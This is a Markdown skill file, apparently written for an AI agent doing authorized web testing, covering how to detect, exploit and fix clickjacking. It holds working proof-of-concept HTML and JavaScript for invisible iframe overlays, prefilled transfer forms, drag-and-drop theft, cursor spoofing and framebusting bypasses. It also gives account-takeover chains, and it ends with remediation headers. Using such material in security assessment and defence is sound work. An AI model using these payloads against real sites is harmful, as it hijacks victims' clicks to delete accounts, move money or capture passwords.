---
name: clickjacking
description: Detect, exploit, and remediate Clickjacking and UI-redressing attacks using invisible iframe overlays, drag-and-drop data theft, prefilled-form tricks, cursor spoofing, and framebusting bypasses against endpoints lacking X-Frame-Options or CSP frame-ancestors protection.
---

# Clickjacking & UI-Redressing

## When to use this skill

Use this skill during authorized web application assessments when you need to determine whether sensitive state-changing endpoints (account deletion, email/2FA settings changes, OAuth consent, money transfers, social actions) can be framed by an attacker-controlled origin and clicked on behalf of an authenticated victim. Clickjacking requires only that the target renders inside an iframe on a hostile page — no XSS, no CSRF token leak, no same-origin access needed. Test every endpoint that performs a one-click destructive or privilege-changing action.

## Methodology

### 1. Header-Based Detection

Framing protection is declared via `X-Frame-Options` (legacy) or CSP `frame-ancestors` (modern). Probe every interesting endpoint — protections are frequently applied globally at the edge but missing on specific routes, API-driven HTML views, or legacy subdomains.

```bash
# Check framing headers on target endpoints
for url in \
  "https://target.com/settings/delete-account" \
  "https://target.com/oauth/authorize" \
  "https://api.target.com/v1/account/close"; do
  echo "=== $url ==="
  curl -sI "$url" | grep -iE "x-frame-options|content-security-policy|frame-ancestors" || echo "NO FRAMING PROTECTION"
done
```

Interpretation:
- `X-Frame-Options: DENY` or `SAMEORIGIN` → protected (but check for typos like `ALLOW-FROM`, which is dead and ignored).
- `Content-Security-Policy: frame-ancestors 'none'` or `'self'` → protected.
- Both absent, or CSP present without a `frame-ancestors` directive → **framing possible**. Note: `frame-ancestors` must be delivered as a header; a `<meta>` CSP tag is ignored for framing.
- Verify with a quick local harness:

```html
<!-- frame-test.html — open locally; if target renders, it is framable -->
<iframe src="https://target.com/settings/delete-account" width="900" height="600"></iframe>
```

### 2. Burp Suite Clickbandit

For manual confirmation inside Burp: proxy the target session, switch to the **Clickbandit** tab, click "Load Clickbandit", then use "Toggle Click Bandit" to make the framed page transparent while keeping clickable elements visible. Draw a highlight over the real button you intend to hijack, then export a generated PoC HTML with `position:absolute` overlay math already computed. Clickbandit handles scrolling iframes and produces a self-contained exploit file — use it as a baseline, then hand-tune offsets.

### 3. Basic Invisible-Iframe Overlay PoC

The classic UI-redressing primitive: render the target in an iframe at near-zero opacity, position it so the victim's sensitive button sits exactly under a decoy button on the attacker page. The victim sees the decoy; the click lands on the iframe.

```html
<!DOCTYPE html>
<html>
<body style="background:#fff">
  <h1>Win a free prize — click below!</h1>

  <!-- Decoy button the victim sees -->
  <button style="padding:20px 40px;font-size:20px">CLAIM PRIZE</button>

  <!-- Invisible iframe aligned so target's "Delete Account" sits under decoy -->
  <div style="position:absolute; top:40px; left:20px; overflow:hidden;
              width:600px; height:400px; opacity:0.0001; z-index:10;">
    <iframe src="https://target.com/settings/delete-account"
            style="width:1200px; height:800px; border:0;
                   margin-left:-300px; margin-top:-250px;"
            scrolling="no"></iframe>
  </div>
</body>
</html>
```

Tuning workflow: set `opacity:0.5` temporarily to align offsets visually, then drop to `0.0001`. Add `pointer-events:none` on decoys so clicks pass through. For multi-step flows (click confirm → click "Yes"), stack two iframes and swap visibility on the first click via a tiny JS handler.

### 4. Prefilled-Form Clickjacking (Data Theft)

If the target's form fields are pre-filled from the URL (e.g. `/transfer?to=attacker&amount=1000` or `/invite?email=attacker@evil.com`), you can frame the prefilled form and trick the victim into submitting **their** credentials/tokens alongside **attacker-controlled** field values — or trick them into typing data into what they believe is a harmless field.

```html
<!-- Victim thinks they're liking a page; actually submitting attacker's transfer form -->
<div style="position:relative; width:500px; height:300px; overflow:hidden">
  <iframe src="https://target.com/transfer?to=ATTACKER_ACCT&amount=500"
          style="position:absolute; top:-80px; left:-120px;
                 width:800px; height:600px; opacity:0.0001"></iframe>
</div>
<button style="position:absolute; top:120px; left:180px;
               padding:15px 30px">👍 Like this page</button>
```

Even without URL prefill, combine with a visible attacker-owned input ("enter your email to win") positioned over the target's password field: the victim types their password into the invisible framed login form and clicks what they think is "Enter Giveaway" — submitting credentials directly to the real target login endpoint.

### 5. Drag-and-Drop Data Theft

Browsers allow dragging text *into* an iframe across origins. Chain this to exfiltrate data displayed on the attacker page into a framed target form (e.g. auto-fill a search/feedback box that echoes content back), or to drag victim-selected text into a hidden `textarea` that auto-submits.

```html
<!-- Victim drags highlighted "prize code" text into an invisible textarea
     inside a framed target form that auto-submits on blur -->
<div style="position:relative">
  <span id="prize" style="user-select:none">🎉 You won CODE-7734! Drag me to claim.</span>
  <div style="position:absolute; top:0; left:0; opacity:0.0001; overflow:hidden">
    <iframe src="https://target.com/support/ticket" style="width:800px;height:600px;border:0"></iframe>
  </div>
</div>
```

Practical variant: use `event.dataTransfer` on the attacker page plus mousedown/mouseup choreography so the victim performs drag-start on decoy text and drag-end over coordinates aligned to the framed input. Works best against forms with auto-submit-on-blur or a large submit button.

### 6. Cursor Spoofing

Hide the real cursor and draw a fake one that always trails where you want the victim to *believe* they're clicking:

```html
<style>
  body { cursor: none; } /* hide real cursor over the whole page */
  #fake-cursor { position: fixed; pointer-events: none; z-index: 9999;
                 font-size: 24px; }
</style>
<div id="fake-cursor">🖱️</div>
<script>
document.addEventListener('mousemove', e => {
  const c = document.getElementById('fake-cursor');
  // Offset the fake cursor ~150px from the real one so it hovers
  // over the decoy while the real cursor sits on the hidden button
  c.style.left = (e.clientX - 150) + 'px';
  c.style.top  = (e.clientY - 40) + 'px';
});
</script>
```

Combine with `opacity:0.0001` iframes and CSS `transform: skew()` on decoy content so hover-highlight effects on the target page don't betray the misalignment.

### 7. Framebusting Bypass

Legacy apps use client-side framebusting (`if (top !== self) top.location = self.location`). Bypass it:

**a) HTML5 `sandbox` attribute** — `sandbox` without `allow-top-navigation` silently kills any JS attempt by the framed page to navigate or bust out:

```html
<iframe src="https://target.com/settings" sandbox="allow-forms allow-scripts"></iframe>
```

The page renders and its own scripts run, but `top.location = ...` throws/blocks — framebusting neutralized.

**b) `onbeforeunload` cancel trick** — for targets without sandbox-compatible behavior, repeatedly cancel the bust navigation:

```html
<iframe src="https://target.com/settings"></iframe>
<script>
  // Every attempted top-navigation triggers beforeunload on attacker page;
  // returning "" prompts "Leave site?" — most victims click Stay,
  // and we re-invoke via user interaction chain (double-clickjacking)
  window.onbeforeunload = () => { return ""; };
</script>
```

**c) Others:** use `<iframe csp>` where supported, or serve from `<object>/<embed>` where busting behaves differently. Also test `X-Frame-Options` on embedded subresources — some apps only protect top-level routes.

### Exploit Chains

- **One-click account deletion:** frame `/settings/delete-account`, overlay decoy "Download wallpaper" button → victim's authenticated session cookie executes deletion.
- **OAuth email hook:** frame `/oauth/authorize?client_id=...&redirect_uri=...` during an app-install flow; overlay decoy so victim approves attacker's OAuth client which then persists an attacker-controlled recovery email or grants token access.
- **Chained double-click:** step 1 changes victim's email via prefilled form (`?email=attacker@evil.com`), step 2 hits "Forgot password" — full account takeover with two innocent-looking clicks.
- **CSRF amplifier:** where CSRF tokens exist but framing is allowed, clickjacking *is* the CSRF delivery vehicle — victim's click includes valid token + session automatically.

### Remediation

- Send `X-Frame-Options: DENY` (or `SAMEORIGIN` if the app legitimately frames itself) on **all** responses, enforced globally at the web server/proxy layer — not per-route.
- Send `Content-Security-Policy: frame-ancestors 'none'`; CSP supersedes XFO in modern browsers and supports multi-parent allowlists (`frame-ancestors 'self' https://trusted.partner.com`).
- Never rely on client-side framebusting JS alone — it is bypassable via `sandbox`, beforeunload tricks, and disabled JS edge cases.
- Set session cookies with `SameSite=Lax` or `Strict` — this blocks cross-site POST auto-submission chains though not top-level click-driven GETs.
- Require re-authentication or a typed confirmation phrase for high-impact actions (delete account, change email); consider short-lived intent tokens bound to user-initiated navigation.
- Add random request-level nonces to state-changing forms and reject submissions where `Sec-Fetch-Dest: document` + `Referer` indicates an unexpected embedding context.
